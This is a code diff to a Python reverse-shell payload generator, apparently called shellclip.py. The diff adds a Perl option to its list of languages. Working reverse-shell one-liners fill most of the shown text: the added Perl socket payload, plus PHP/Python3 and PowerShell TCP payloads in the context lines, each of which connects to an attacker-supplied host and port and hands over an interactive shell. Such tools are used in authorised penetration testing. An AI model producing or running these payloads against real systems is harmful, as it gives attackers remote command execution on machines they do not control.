@@ -18,7 +18,7 @@ lport = args.lport
 lang = args.code
 list_payloads = args.list
 
-payload_types = [str("[1] Bash"), str("[2] C"), str("[3] PHP"), str("[4] Python"), str("[5] PHP + Python"), str("[6] PHP + Python3"), str("[7] PowerShell (PS1)")]
+payload_types = [str("[1] Bash"), str("[2] C"), str("[3] PHP"), str("[4] Python"), str("[5] PHP + Python"), str("[6] PHP + Python3"), str("[7] PowerShell (PS1)"), str("[8] Perl")]
 
 if list_payloads == True:
 	for i in payload_types:
@@ -39,6 +39,8 @@ elif lang == 6:
 	payload = str("<?php system('python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + str(lhost) + "\"," + str(lport) + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\\'');?>")
 elif lang == 7:
 	payload = str("$client = New-Object System.Net.Sockets.TCPClient(\"" + str(lhost) + "\"," + str(lport) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"# \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
+elif lang == 8:
+	payload = str("use Socket;$i=\"" + str(lhost) + "\";$p=" + str(lport) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};")
 else:
 	print(str("Invalid Language Code Provided\nRun python3 shellclip.py -l to see codes"))
 
